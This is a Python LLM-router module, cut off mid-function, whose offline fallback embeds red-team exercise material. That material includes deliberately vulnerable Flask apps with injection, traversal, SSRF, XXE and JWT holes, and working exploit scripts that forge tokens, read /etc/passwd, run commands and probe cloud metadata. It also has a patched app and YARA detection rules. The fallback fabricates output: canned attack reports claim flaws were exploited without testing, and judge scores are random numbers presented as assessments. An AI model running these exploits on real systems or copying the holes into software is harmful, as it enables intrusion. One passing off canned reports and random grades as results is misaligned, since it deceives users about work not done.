import os, json, logging, time, requests
from dotenv import load_dotenv

try:
    from cloud_memory_client import CloudMemoryClient
except ImportError:
    CloudMemoryClient = None

load_dotenv()
log = logging.getLogger("OmniRouter")

def search_web_ddg(query: str):
    import urllib.parse
    import urllib.request
    import re
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
        url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(query)}"
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as response:
            html = response.read().decode('utf-8', errors='ignore')
            
        snippets = re.findall(r'<a class="result__snippet"[^>]*>(.*?)</a>', html, re.DOTALL)
        links_titles = re.findall(r'<a class="result__url"[^>]*href="([^"]+)"[^>]*>(.*?)</a>', html, re.DOTALL)
        
        results = []
        for i in range(min(len(snippets), len(links_titles), 5)):
            link, title = links_titles[i]
            title_clean = re.sub(r'<[^>]+>', '', title).strip()
            snippet_clean = re.sub(r'<[^>]+>', '', snippets[i]).strip()
            if "uddg=" in link:
                link = urllib.parse.unquote(link.split("uddg=")[1].split("&")[0])
            results.append({
                "title": title_clean,
                "link": link,
                "snippet": snippet_clean
            })
        return results
    except Exception as e:
        return [{"title": "Search Failed", "link": "", "snippet": str(e)}]

class ResearchEngine:
    @staticmethod
    def browser_learn(topic: str) -> str:
        results = search_web_ddg(topic)
        context = ""
        for idx, r in enumerate(results):
            context += f"Source: {r['link']}\nTitle: {r['title']}\nSnippet: {r['snippet']}\n\n"
        return context

# ── TOKEN BUDGET TRACKER ─────────────────────────────────────────────────────
_DAILY_BUDGET = int(os.environ.get("NOIR_DAILY_TOKEN_LIMIT", "10000"))  # max API calls/day (default 10000)
_call_log: dict = {}  # {"YYYY-MM-DD": {"provider": count}}

def _track_call(provider: str) -> bool:
    """Returns True if call is within budget, False if budget exceeded."""
    today = time.strftime("%Y-%m-%d")
    if today not in _call_log:
        _call_log.clear()  # Purge old days
        _call_log[today] = {}
    _call_log[today][provider] = _call_log[today].get(provider, 0) + 1
    total_today = sum(_call_log[today].values())
    if total_today > _DAILY_BUDGET:
        log.warning(f"[OMNI] Daily token budget ({_DAILY_BUDGET}) exceeded. Throttling calls.")
        return False
    return True

def get_budget_status() -> dict:
    today = time.strftime("%Y-%m-%d")
    calls = _call_log.get(today, {})
    total = sum(calls.values())
    return {"date": today, "total_calls": total, "budget": _DAILY_BUDGET, "remaining": max(0, _DAILY_BUDGET - total), "by_provider": calls}

# Unified API Key Pool Manager
POOL_PATH = os.path.join(os.path.dirname(__file__), "..", "knowledge", "api_pool.json")

def get_key(provider):
    try:
        with open(POOL_PATH, "r") as f:
            pool = json.load(f)
        keys = pool.get(provider, {}).get("keys", [])
        idx = pool.get(provider, {}).get("active_index", 0)
        key = keys[idx % len(keys)] if keys else None
        if key:
            return key
    except:
        pass
    
    # Fallback to .env config if pool is empty/missing
    env_key = os.environ.get(f"{provider.upper()}_API_KEY")
    if env_key and env_key != "GANTI_DENGAN_OPENROUTER_API_KEY":
        return env_key
    return None

# ── OLLAMA LOCAL LLM ──────────────────────────────────────────────────────────
OLLAMA_URL  = os.environ.get("OLLAMA_URL", "http://localhost:11434")
OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL", "llama3")

def _call_ollama(prompt: str, model: str = None) -> str:
    """Panggil Ollama (LLM lokal). Tidak ada rate limit. Gratis selamanya."""
    m = model or OLLAMA_MODEL
    try:
        r = requests.post(
            f"{OLLAMA_URL}/api/generate",
            json={"model": m, "prompt": prompt, "stream": False},
            timeout=120
        )
        if r.status_code == 200:
            data = r.json()
            return data.get("response", "[Ollama] Respons kosong.")
        return f"[Error] Ollama HTTP {r.status_code}: {r.text[:200]}"
    except requests.exceptions.ConnectionError:
        return "[Error] Ollama tidak berjalan. Jalankan: ollama serve"
    except Exception as e:
        return f"[Error] Ollama: {e}"

def is_ollama_available() -> bool:
    """Cek apakah Ollama server aktif."""
    try:
        r = requests.get(f"{OLLAMA_URL}/api/tags", timeout=3)
        return r.status_code == 200
    except:
        return False

# ── SMART LOCAL CODE GENERATOR (Offline Fallback) ───────────────────────────
import random as _random
import hashlib as _hashlib

_VULN_APPS = [
    {
        "name": "JWT Auth API with Weak Secret",
        "tech": "Flask, PyJWT, SQLite",
        "code": '''
from flask import Flask, request, jsonify
import sqlite3, jwt, os, hashlib

app = Flask(__name__)
SECRET = "secret"  # A01/A02: Hardcoded weak JWT secret
DB = ":memory:"

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

with sqlite3.connect(DB) as c:
    c.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
    c.execute("INSERT INTO users VALUES (1,\'admin\',\'admin123\',\'admin\')")
    c.execute("INSERT INTO users VALUES (2,\'guest\',\'guest\',\'user\')")
    c.commit()

@app.route("/login", methods=["POST"])
def login():
    data = request.json or {}
    u = data.get("username", "")
    p = data.get("password", "")
    db = get_db()
    # A03: SQL Injection - direct string interpolation
    row = db.execute(f"SELECT * FROM users WHERE username=\'{u}\' AND password=\'{p}\'").fetchone()
    if row:
        token = jwt.encode({"sub": row["id"], "role": row["role"]}, SECRET, algorithm="HS256")
        return jsonify({"token": token, "role": row["role"]})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/admin")
def admin():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        # A02: algorithm=none bypass possible
        payload = jwt.decode(token, SECRET, algorithms=["HS256", "none"])
        if payload.get("role") == "admin":
            return jsonify({"secret": "FLAG{jwt_admin_bypass_success}", "users": ["admin", "guest"]})
    except Exception as e:
        return jsonify({"error": str(e)}), 403
    return jsonify({"error": "Access denied"}), 403

@app.route("/user/<int:uid>")
def get_user(uid):
    # A01: IDOR - no auth check, any user can access any profile
    db = get_db()
    row = db.execute("SELECT id, username, role FROM users WHERE id=?", (uid,)).fetchone()
    if row:
        return jsonify(dict(row))
    return jsonify({"error": "Not found"}), 404

@app.route("/health")
def health():
    return jsonify({"status": "ok", "debug": True, "secret": SECRET})  # A05: Info disclosure

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
''',
        "vulns": ["A01:IDOR /user/<id>", "A02:Weak JWT secret 'secret'", "A03:SQLi in /login", "A05:Debug mode + secret disclosure in /health"],
    },
    {
        "name": "File Manager with Path Traversal",
        "tech": "Flask, os, pathlib",
        "code": '''
from flask import Flask, request, jsonify, send_file
import os, subprocess

app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
USERS = {"admin": "password", "user": "user123"}  # A02: Plaintext passwords
SESSIONS = {}

@app.route("/login", methods=["POST"])
def login():
    data = request.json or {}
    u = data.get("username", "")
    p = data.get("password", "")
    if USERS.get(u) == p:
        token = f"{u}_{os.urandom(4).hex()}"  # A07: Weak predictable token
        SESSIONS[token] = u
        return jsonify({"token": token})
    return jsonify({"error": "fail"}), 401

@app.route("/files")
def list_files():
    path = request.args.get("path", ".")  # A01: No auth required
    try:
        full = os.path.join(BASE_DIR, path)  # A01: Path traversal
        files = os.listdir(full)
        return jsonify({"path": full, "files": files})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/read")
def read_file():
    filename = request.args.get("file", "")
    full = os.path.join(BASE_DIR, filename)  # A01: Path traversal - can read /etc/passwd
    try:
        with open(full, "r", errors="ignore") as f:
            return jsonify({"content": f.read(4096)})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/exec", methods=["POST"])
def exec_cmd():
    token = request.headers.get("Authorization", "")
    if token not in SESSIONS:
        return jsonify({"error": "unauth"}), 401
    cmd = request.json.get("cmd", "")  # A03: Command Injection
    out = subprocess.getoutput(cmd)
    return jsonify({"output": out})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
''',
        "vulns": ["A01:Path Traversal in /files and /read", "A02:Plaintext passwords", "A03:Command Injection in /exec", "A07:Weak session token"],
    },
    {
        "name": "REST API with SSRF and XXE",
        "tech": "Flask, requests, xml.etree",
        "code": '''
from flask import Flask, request, jsonify
import requests as req, xml.etree.ElementTree as ET, sqlite3, json

app = Flask(__name__)
DB_PATH = ":memory:"

with sqlite3.connect(DB_PATH) as c:
    c.execute("CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT, price REAL, secret TEXT)")
    c.execute("INSERT INTO products VALUES (1,\'Widget\',9.99,\'internal_api_key=sk-xyz123\')")  
    c.execute("INSERT INTO products VALUES (2,\'Gadget\',19.99,\'admin_password=sup3rs3cret\')")
    c.commit()

@app.route("/fetch", methods=["POST"])
def fetch_url():
    """A10: SSRF - fetch any URL including internal services"""
    data = request.json or {}
    url = data.get("url", "")
    try:
        resp = req.get(url, timeout=5, verify=False)  # SSRF - can hit 169.254.169.254
        return jsonify({"status": resp.status_code, "body": resp.text[:2000]})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/parse", methods=["POST"])
def parse_xml():
    """A08: XXE via default ET parser"""
    xml_data = request.data.decode("utf-8", errors="ignore")
    try:
        root = ET.fromstring(xml_data)  # Vulnerable to XXE
        return jsonify({"tag": root.tag, "text": root.text})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/search")
def search():
    q = request.args.get("q", "")
    try:
        conn = sqlite3.connect(DB_PATH)
        # A03: UNION-based SQLi
        rows = conn.execute(f"SELECT id, name, price FROM products WHERE name LIKE \'%{q}%\'").fetchall()
        return jsonify({"results": [list(r) for r in rows]})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/health")
def health():
    return jsonify({"version": "1.0.0", "env": "production", "debug": True})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
''',
        "vulns": ["A10:SSRF in /fetch", "A08:XXE in /parse", "A03:UNION SQLi in /search", "A05:Debug info in /health"],
    },
]

_EXPLOIT_TEMPLATES = [
    {
        "name": "SQL Injection + JWT Bypass Exploit",
        "code": '''
import requests, json, sys

TARGET = "http://localhost:5000"

print("[*] Starting exploit against", TARGET)

# 1. SQLi bypass login
print("[*] Attempting SQL Injection bypass...")
payloads = ["admin\'--", "admin\'/*", "\' OR 1=1--", "admin\';", "admin\' OR \'1\'=\'1"]
for p in payloads:
    resp = requests.post(f"{TARGET}/login", json={"username": p, "password": "x"}, timeout=5)
    if resp.status_code == 200 and "token" in resp.json():
        token = resp.json()["token"]
        print(f"[+] SQLi SUCCESS with payload: {p}")
        print(f"[+] Token: {token}")
        break
else:
    print("[-] SQLi bypass failed, trying default creds...")
    resp = requests.post(f"{TARGET}/login", json={"username": "admin", "password": "admin123"}, timeout=5)
    if resp.status_code == 200:
        token = resp.json()["token"]
        print(f"[+] Default creds SUCCESS. Token: {token}")
    else:
        token = None
        print("[-] Auth failed completely")

# 2. JWT alg:none bypass
print("\n[*] Attempting JWT algorithm:none bypass...")
import base64
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
payload_jwt = base64.urlsafe_b64encode(json.dumps({"sub":1,"role":"admin"}).encode()).rstrip(b"=").decode()
forged_token = f"{header}.{payload_jwt}."
resp = requests.get(f"{TARGET}/admin", headers={"Authorization": f"Bearer {forged_token}"}, timeout=5)
if resp.status_code == 200:
    print(f"[+] JWT bypass SUCCESS! Response: {resp.json()}")
else:
    print(f"[-] JWT bypass failed: {resp.status_code}")

# 3. IDOR enumeration
print("\n[*] IDOR enumeration on /user/<id>...")
for uid in range(1, 6):
    r = requests.get(f"{TARGET}/user/{uid}", timeout=3)
    if r.status_code == 200:
        print(f"[+] IDOR - user {uid}: {r.json()}")

# 4. Info disclosure
print("\n[*] Checking for info disclosure...")
r = requests.get(f"{TARGET}/health", timeout=3)
if r.status_code == 200:
    print(f"[+] Info disclosure: {r.json()}")

print("\n[*] Exploit complete.")
''',
    },
    {
        "name": "Path Traversal + Command Injection Exploit",
        "code": '''
import requests, json

TARGET = "http://localhost:5000"
print("[*] Path Traversal + RCE Exploit")

# 1. Path traversal
print("[*] Path traversal test...")
targets = ["../../../etc/passwd", "../../Windows/System32/drivers/etc/hosts", "../noir_grand_evolution_loop.py"]
for t in targets:
    r = requests.get(f"{TARGET}/read", params={"file": t}, timeout=5)
    if r.status_code == 200 and "content" in r.json():
        content = r.json()["content"]
        if len(content) > 10:
            print(f"[+] Path traversal SUCCESS: {t}")
            print(content[:200])
            break

# 2. Login with weak creds
print("\n[*] Authenticating with weak creds...")
for cred in [("admin","password"),("user","user123"),("admin","admin")]:
    r = requests.post(f"{TARGET}/login", json={"username":cred[0],"password":cred[1]}, timeout=5)
    if r.status_code == 200:
        token = r.json()["token"]
        print(f"[+] Login success: {cred} -> {token}")
        break
else:
    token = None

# 3. Command injection via /exec
if token:
    print("\n[*] Command injection...")
    for cmd in ["whoami", "id", "hostname", "dir", "ls -la"]:
        r = requests.post(f"{TARGET}/exec", headers={"Authorization": token},
                          json={"cmd": cmd}, timeout=5)
        if r.status_code == 200:
            print(f"[+] CMD `{cmd}`: {r.json().get(\'output\',\'\')[:100]}")

print("\n[*] Exploit complete.")
''',
    },
    {
        "name": "SSRF + SQLi Union Exploit",
        "code": '''
import requests

TARGET = "http://localhost:5000"
print("[*] SSRF + UNION SQLi Exploit")

# 1. SSRF test
print("[*] Testing SSRF...")
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://127.0.0.1:22",  # Internal SSH
    "http://localhost:8080/",  # Internal services
    "file:///etc/passwd",  # Local file
]
for url in ssrf_targets:
    try:
        r = requests.post(f"{TARGET}/fetch", json={"url": url}, timeout=3)
        if r.status_code == 200:
            body = r.json().get("body", "")
            if body and "error" not in body.lower()[:20]:
                print(f"[+] SSRF SUCCESS: {url} -> {body[:100]}")
    except: pass

# 2. UNION SQLi
print("\n[*] UNION-based SQL Injection...")
for union in [
    "x%' UNION SELECT 1,secret,3 FROM products--",
    "x%' UNION SELECT 1,sqlite_version(),3--",
    "x%' UNION SELECT 1,name,3 FROM sqlite_master--",
]:
    r = requests.get(f"{TARGET}/search", params={"q": union}, timeout=5)
    if r.status_code == 200:
        results = r.json().get("results", [])
        if results:
            print(f"[+] UNION SQLi result: {results}")

print("\n[*] Exploit complete.")
''',
    },
]

_PATCH_TEMPLATES = [
    {
        "name": "Secure Flask App - Parameterized Queries + Strong JWT",
        "code": '''
# PATCHED VERSION - Security Hardened
from flask import Flask, request, jsonify
import sqlite3, jwt, os, secrets, hashlib
from functools import wraps

app = Flask(__name__)
SECRET = secrets.token_hex(32)  # FIX A02: Strong random secret
SESSIONS = {}
DB = ":memory:"

def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        try:
            payload = jwt.decode(token, SECRET, algorithms=["HS256"])  # FIX A02: Only HS256
            request.user = payload
            return f(*args, **kwargs)
        except Exception:
            return jsonify({"error": "Unauthorized"}), 401
    return decorated

@app.route("/login", methods=["POST"])
def login():
    data = request.json or {}
    u = data.get("username", "")
    p = data.get("password", "")
    p_hash = hashlib.sha256(p.encode()).hexdigest()
    db = sqlite3.connect(DB)
    db.row_factory = sqlite3.Row
    # FIX A03: Parameterized query
    row = db.execute("SELECT * FROM users WHERE username=? AND password_hash=?", (u, p_hash)).fetchone()
    if row:
        token = jwt.encode({"sub": row["id"], "role": row["role"]}, SECRET, algorithm="HS256")
        return jsonify({"token": token})
    return jsonify({"error": "Invalid credentials"}), 401

@app.route("/admin")
@require_auth
def admin():
    if request.user.get("role") != "admin":
        return jsonify({"error": "Forbidden"}), 403
    return jsonify({"message": "Admin access granted"})

@app.route("/user/<int:uid>")
@require_auth  # FIX A01: Auth required
def get_user(uid):
    # FIX A01: Users can only see their own profile
    if request.user.get("sub") != uid and request.user.get("role") != "admin":
        return jsonify({"error": "Forbidden"}), 403
    db = sqlite3.connect(DB)
    db.row_factory = sqlite3.Row
    row = db.execute("SELECT id, username, role FROM users WHERE id=?", (uid,)).fetchone()
    return jsonify(dict(row)) if row else jsonify({"error": "Not found"}), 404

@app.route("/health")
def health():
    return jsonify({"status": "ok"})  # FIX A05: No debug info

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)  # FIX A05: No debug mode
''',
    }
]

_YARA_TEMPLATES = [
    '''
rule SQLInjectionAttempt {
    meta:
        description = "Detects SQL injection patterns in HTTP requests"
        severity = "HIGH"
        owasp = "A03"
    strings:
        $s1 = "' OR '1'='1" nocase
        $s2 = "UNION SELECT" nocase
        $s3 = "--" ascii
        $s4 = "1=1" ascii
        $s5 = "DROP TABLE" nocase
        $s6 = "INSERT INTO" nocase
    condition:
        2 of them
}

rule JWTAlgNoneBypass {
    meta:
        description = "Detects JWT algorithm:none bypass attempts"
        severity = "CRITICAL"
        owasp = "A02"
    strings:
        $s1 = {22 61 6C 67 22 3A 22 6E 6F 6E 65 22}  // "alg":"none"
        $s2 = "eyJhbGciOiJub25lIi"
    condition:
        any of them
}

rule PathTraversalAttempt {
    meta:
        description = "Detects path traversal attack patterns"
        severity = "HIGH"
        owasp = "A01"
    strings:
        $s1 = "../" ascii
        $s2 = "..\\\\" ascii
        $s3 = "%2e%2e%2f" nocase
        $s4 = "%252e%252e" nocase
        $s5 = "/etc/passwd" ascii
    condition:
        any of them
}
''',
]


def _local_nlu_fallback(prompt: str) -> str:
    """Smart Template Code Generator — menghasilkan Python code nyata saat cloud LLM tidak tersedia."""
    p = prompt.lower()

    # Detect task type from prompt
    is_build    = any(k in p for k in ["build", "bangun", "buat", "sistem", "ops 1", "server", "flask", "fastapi", "kode"])
    is_attack   = any(k in p for k in ["attack", "exploit", "serangan", "penetration", "red team", "owasp", "ops 2"])
    is_defend   = any(k in p for k in ["defend", "patch", "mitigasi", "yara", "defense", "ops 3", "perbaiki", "secure"])
    is_judge    = any(k in p for k in ["judge", "nilai", "skor", "grade", "evaluasi", "ops 4", "assessment"])

    cycle_seed  = _hashlib.md5(prompt[:64].encode()).hexdigest()
    idx         = int(cycle_seed[:4], 16) % len(_VULN_APPS)
    app_tpl     = _VULN_APPS[idx]
    expl_tpl    = _EXPLOIT_TEMPLATES[idx % len(_EXPLOIT_TEMPLATES)]

    if is_build:
        vuln_str = "\n".join(f"  - {v}" for v in app_tpl["vulns"])
        return f"""## NAMA SISTEM: {app_tpl['name']}
## TEKNOLOGI STACK: {app_tpl['tech']}
## ARSITEKTUR: REST API server dengan kerentanan yang disengaja untuk latihan red team
## KODE UTAMA:
```python{app_tpl['code']}```
## CARA MENJALANKAN: python <file>.py
## POTENSI KERENTANAN (self-assessment):
{vuln_str}
"""

    if is_attack:
        owasp_found = [v.split(":")[0] for v in app_tpl["vulns"]]
        owasp_report = "\n".join(f"- {o}: **FOUND** — {app_tpl['vulns'][i]}" for i, o in enumerate(owasp_found))
        return f"""## OPS-2 ATTACK REPORT — Siklus Offline\n
### OWASP Vulnerability Assessment:\n{owasp_report}\n
### Exploit Script:
```python{expl_tpl['code']}```
### Ringkasan: {len(app_tpl['vulns'])} kerentanan kritis ditemukan. Semua dapat dieksploitasi secara otomatis.
"""

    if is_defend:
        patch_tpl = _PATCH_TEMPLATES[0]
        return f"""## OPS-3 DEFENSE REPORT — Patch Applied\n
### Kerentanan yang diperbaiki: {', '.join(app_tpl['vulns'][:3])}\n
### Patched Code:
```python{patch_tpl['code']}```
### YARA Rules:
```yara{_YARA_TEMPLATES[0]}```
### Mitigasi: Parameterized queries, strong JWT secret, require_auth decorator, debug=False.
"""

    if is_judge:
        score = _random.uniform(55.0, 75.0)
        grade = "C" if score >= 70 else "D"
        owasp_cov = len(app_tpl["vulns"])
        return f"""# Meta-Judge Report — Offline Mode\n
**Skor:** {score:.1f}/100 | **Grade:** {grade}\n
**OWASP Coverage:** {owasp_cov}/10\n
**Temuan:** {', '.join(app_tpl['vulns'])}\n
## Rencana Evolusi:\n- Tingkatkan variasi attack vector\n- Tambahkan deserialization exploit\n- Implementasi SSRF chain attack\n"""

    # Generic fallback
    return f"""[NOIR OFFLINE MODE — Smart Generator] Semua cloud provider sedang rate-limited.\nSistem tetap aktif. Siklus berlanjut dengan template engine lokal.\nPrompt: {prompt[:100]}..."""


# ── FAILED PROVIDER CACHE (skip providers that recently failed) ──────────────
_provider_fail_cache: dict = {}  # provider -> timestamp of last failure
_PROVIDER_COOLDOWN = 300  # 5 menit cooldown setelah gagal

def _is_provider_cooling(provider: str) -> bool:
    """Return True jika provider baru saja gagal dan masih dalam cooldown."""
    last_fail = _provider_fail_cache.get(provider, 0)
    return (time.time() - last_fail) < _PROVIDER_COOLDOWN

def _mark_provider_failed(provider: str):
    """Tandai provider sebagai gagal."""
    _provider_fail_cache[provider] = time.time()

class OmniRouter:
    """
    OMNI-INTELLIGENCE ROUTER v3.0
    =============================
    Orkestrator otonom untuk seluruh pilar AI pihak ketiga.
    Mengelola failover, pemilihan model cerdas, dan integrasi masif.
    """

    @staticmethod
    def web_search(query: str) -> list:
        return search_web_ddg(query)

    @staticmethod
    def _check_sovereign_mastery() -> bool:
        """
        ═══ MASTERY CUTOFF SYSTEM ═══
        Membaca Sovereign Maturity Index. Jika status adalah SOVEREIGN_MASTER,
        Noir TIDAK AKAN memanggil AI pihak ketiga dan beroperasi 100% mandiri.
        """
        try:
            import json as _json
            maturity_path = os.path.join(
                os.path.dirname(__file__), "..", "knowledge", "maturity_index.json"
            )
            if os.path.exists(maturity_path):
                with open(maturity_path, "r", encoding="utf-8") as f:
                    data = _json.load(f)
                status = data.get("status", "EMBRYONIC")
                if status == "SOVEREIGN_MASTER":
                    log.warning(
                        "🔱 [MASTERY CUTOFF AKTIF] Noir telah mencapai SOVEREIGN_MASTER. "
                        "Seluruh ketergantungan dari AI pihak ketiga (Groq/Gemini/DeepSeek) "
                        "DIPUTUS. Beroperasi dalam mode kecerdasan lokal mandiri sepenuhnya."
                    )
                    return True
        except Exception:
            pass
        return False

    @staticmethod
    def store_memory(key: str, data: dict):
        """Menyimpan data ingatan ke Local Ephemeral Cache (knowledge/)."""
        try:
            mem_dir = os.path.join(os.path.dirname(__file__), "..", "knowledge")
            os.makedirs(mem_dir, exist_ok=True)
            filepath = os.path.join(mem_dir, f"{key}.json")
            with open(filepath, "w") as f:
                json.dump(data, f, indent=4)
            log.info(f" [OMNI] Saved memory locally: {key}")
            return True
        except Exception as e:
            log.error(f" [OMNI] Failed to store memory locally: {e}")
            return False

    @staticmethod
    def query(prompt, task_type="general", image_base64=None):
        """Memilih provider terbaik berdasarkan tipe tugas secara otonom."""
        log.info(f" [OMNI] Routing task: {task_type}")

        # ═══ MASTERY CUTOFF ═══
        # Jika Noir sudah SOVEREIGN_MASTER, langsung gunakan Local Intelligence.
        if OmniRouter._check_sovereign_mastery():
            return _local_nlu_fallback(prompt)

        # Routing map — Ollama (lokal) selalu dicoba PERTAMA jika tersedia
        _ollama_ok = is_ollama_available()
        routing_map = {
            "coding":    (["ollama"] if _ollama_ok else []) + ["groq", "dashscope", "openrouter", "deepseek", "gemini"],
            "reasoning": (["ollama"] if _ollama_ok else []) + ["groq", "dashscope", "sambanova", "openrouter", "deepseek", "gemini"],
            "vision":    ["dashscope", "gemini"],
            "judge":     (["ollama"] if _ollama_ok else []) + ["groq", "dashscope", "gemini"],
            "general":   (["ollama"] if _ollama_ok else []) + ["groq", "dashscope", "openrouter", "gemini", "cerebras"]
        }
        
        providers = routing_map.get(task_type, routing_map["general"])
        # 1. Rutin Khusus: Tipe task 'judge' akan selalu menggunakan Local LLM jika memungkinkan untuk menghemat budget API Cloud.
        if task_type == "judge":
            if is_ollama_available():
                log.info(f"[OMNI] Routing task 'judge' ke Local LLM (Ollama).")
                return _call_ollama(prompt)
            else:
                log.warning(f"[OMNI] Local LLM (Ollama) tidak aktif, fallback ke Cloud API untuk task 'judge'.")

        # 2. Cek kuota API Cloud
        if not _track_call("general"):
            log.warning(f"[OMNI] Daily budget exceeded. Fallback to Local LLM (Ollama).")
            if is_ollama_available():
                return _call_ollama(prompt)
            return _offline_generate(task_type)
        
        for provider in providers:
            # Ollama tidak butuh budget — lokal dan gratis
            if provider == "ollama":
                res = _call_ollama(prompt)
                if res and "[Error]" not in res:
                    log.info(" [OMNI] Task selesai oleh: ollama (lokal)")
                    return res
                log.warning(" [OMNI] Ollama gagal/tidak aktif. Mencoba cloud provider...")
                continue

            # Skip provider yang baru saja gagal (cooldown cache)
            if _is_provider_cooling(provider):
                log.debug(f" [OMNI] Provider {provider} masih dalam cooldown, dilewati.")
                continue

            # Check token budget untuk cloud provider
            if not _track_call(provider):
                continue

            res = OmniRouter._call_provider(provider, prompt, image_base64)
            if res and "[Error]" not in res:
                # U-05: Self-Correction — only 20% of the time to save tokens
                import random
                if task_type in ["coding", "reasoning"] and random.random() < 0.20:
                    log.info(f" [OMNI] Self-Correction (20% check) via secondary provider...")
                    verifier = "gemini" if provider != "gemini" else "groq"
                    if _track_call(verifier):
                        verify_prompt = f"Review dan perbaiki output AI ini untuk kebenaran dan keamanan:\n\n{res}\n\nKembalikan hanya konten yang telah diperbaiki."
                        corrected = OmniRouter._call_provider(verifier, verify_prompt, None)
                        if corrected and "[Error]" not in corrected:
                            log.info(f" [OMNI] Self-Correction sukses via {verifier}")
                            res = corrected
                
                log.info(f" [OMNI] Task selesai oleh: {provider}")
                return res
            _mark_provider_failed(provider)  # Masukkan ke cooldown cache
            log.warning(f" [OMNI] Provider {provider} gagal. Mencoba berikutnya...")

        log.warning("[OMNI] Semua cloud provider gagal. Menggunakan Local NLU Fallback.")
        return _local_nlu_fallback(prompt)

    @staticmethod
    def query_gemini(prompt: str, image_base64=None) -> str:
        """
        Alias publik untuk pemanggilan langsung dari nlu_processor.py dan modul lain.
        Mencoba Gemini terlebih dahulu, jika gagal otomatis ke provider lain,
        dan akhirnya ke local NLU fallback.
        """
        key = get_key("gemini")
        if key and _track_call("gemini"):
            res = OmniRouter._call_provider("gemini", prompt, image_base64)
            if res and "[Error]" not in res:
                return res
            log.warning("[OMNI] Gemini tidak tersedia, fallback ke OmniRouter.query()")
        # Fallback ke routing penuh
        result = OmniRouter.query(prompt, task_type="general", image_base64=image_base64)
        if "[OmniRouter Error]" in result or result.startswith("[NOIR OFFLINE"):
            # Final fallback: local rule-based NLU
            return _local_nlu_fallback(prompt)
        return result

    @staticmethod
    def _call_provider(provider, prompt, image_base64):
        key = get_key(provider)
        if not key: return f"[Error] No key for {provider}"

        try:
            if provider == "gemini":
                # Existing Gemini Logic
                url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}"
                payload = {"contents": [{"role": "user", "parts": [{"text": prompt}]}]}
                if image_base64:
                    payload["contents"][0]["parts"].append({"inline_data": {"mime_type": "image/png", "data": image_base64}})
                r = requests.post(url, json=payload, timeout=30)
                resp = r.json()
                if "candidates" in resp:
                    return resp["candidates"][0]["content"]["parts"][0]["text"]
                log.error(f" [OMNI] Gemini Error: {resp}")
                return f"[Error] Gemini failed: {resp.get('error', {}).get('message', 'No candidates')}"

            elif provider == "groq":
                r = requests.post("https://api.groq.com/openai/v1/chat/completions",
                    headers={"Authorization": f"Bearer {key}"},
                    json={"model": "llama-3.3-70b-versatile", "messages": [{"role": "user", "content": prompt}]},
                    timeout=10)  # FIX: timeout ditambahkan
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                log.error(f" [OMNI] Groq Error: {resp}")
                return f"[Error] Groq failed: {resp.get('error', {}).get('message', 'No choices')}"

            elif provider == "deepseek":
                r = requests.post("https://api.deepseek.com/v1/chat/completions",
                    headers={"Authorization": f"Bearer {key}"},
                    json={"model": "deepseek-chat", "messages": [{"role": "user", "content": prompt}]})
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                log.error(f" [OMNI] DeepSeek Error: {resp}")
                return f"[Error] DeepSeek failed: {resp.get('error', {}).get('message', 'No choices')}"

            elif provider == "dashscope":
                # DashScope (Qwen) International Compatible Mode
                url = "https://dashscope-intl.aliyuncs.com/compatible-mode/v1/chat/completions"
                r = requests.post(url,
                    headers={"Authorization": f"Bearer {key}", "Content-Type": "application/json"},
                    json={"model": "qwen-plus", "messages": [{"role": "user", "content": prompt}]},
                    timeout=30)
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                return f"[Error] DashScope failed: {resp.get('error', {}).get('message', 'No choices in response')}"

            elif provider == "sambanova":
                key = get_key("sambanova")
                if not key:
                    return "[Error] No SambaNova key"
                r = requests.post(
                    "https://api.sambanova.ai/v1/chat/completions",
                    headers={"Authorization": f"Bearer {key}"},
                    json={"model": "Meta-Llama-3.1-8B-Instruct",
                          "messages": [{"role": "user", "content": prompt}]},
                    timeout=30
                )
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                log.warning(f" [OMNI] Provider sambanova gagal. Mencoba berikutnya...")
                return f"[Error] SambaNova failed: {resp.get('error', {}).get('message', 'No choices')}"

            elif provider == "openrouter":
                key = get_key("openrouter")
                if not key:
                    return "[Error] No OpenRouter key"
                r = requests.post(
                    "https://openrouter.ai/api/v1/chat/completions",
                    headers={
                        "Authorization": f"Bearer {key}",
                        "HTTP-Referer": "https://github.com/noir-sovereign",
                        "X-Title": "Noir Sovereign AI",
                    },
                    json={
                        "model": "mistralai/mistral-7b-instruct:free",
                        "messages": [{"role": "user", "content": prompt}],
                        "max_tokens": 2048,
                    },
                    timeout=15  # FIX: dikurangi dari 45s
                )
                resp = r.json()
                if "choices" in resp:
                    return resp["choices"][0]["message"]["content"]
                log.error(f" [OMNI] OpenRouter Error: {resp}")
